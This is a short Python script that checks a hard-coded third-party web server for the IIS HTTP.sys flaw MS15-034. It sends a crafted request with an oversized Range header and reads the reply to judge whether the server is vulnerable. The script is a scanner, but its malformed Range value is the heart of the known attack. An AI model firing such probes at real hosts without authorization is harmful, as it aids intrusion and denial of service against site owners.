#!/bin/env python
#coding:utf-8

import socket
import ssl


HOST = "www.de-food.com.tw"
PORT = 443
hexAllFfff = "18446744073709551615"
req1 = "GET / HTTP/1.0\r\n\r\n"
req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"

print("[*] Audit Started")

try:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((HOST, PORT))
    if(PORT == 443):
        context = ssl.create_default_context()
        client_socket = context.wrap_socket(client_socket, server_hostname=HOST)
    client_socket.send(req1.encode())
    boringResp = client_socket.recv(1024)
    if "Microsoft" not in boringResp.decode():
        print("[*] Not IIS")
        exit(0)
    client_socket.close()

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((HOST, PORT))
    if(PORT == 443):
        context = ssl.create_default_context()
        client_socket = context.wrap_socket(client_socket, server_hostname=HOST)
    client_socket.send(req.encode())
    goodResp = client_socket.recv(1024)
    if "Requested Range Not Satisfiable" in goodResp.decode():
        print("[!!] Vulnerability MS15-034 existence!")
    elif " The request has an invalid header name" in goodResp.decode():
        print("[*] Not Vulnerable.")
    else:
        print("[*] Unknown response state.")
                                
except Exception as e:
    print(e)
